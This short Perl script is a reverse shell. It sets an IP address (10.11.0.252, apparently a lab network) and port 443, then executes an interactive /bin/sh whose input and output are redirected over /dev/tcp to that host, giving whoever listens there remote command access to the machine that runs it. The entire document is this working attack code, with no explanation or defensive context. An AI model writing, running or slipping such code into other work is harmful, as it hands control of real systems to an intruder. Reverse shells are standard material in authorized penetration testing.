#!/usr/bin/perl -w

$ip="10.11.0.252";
$port=443;
exec("/bin/sh -i >& /dev/tcp/".$ip."/".$port." 0>&1");
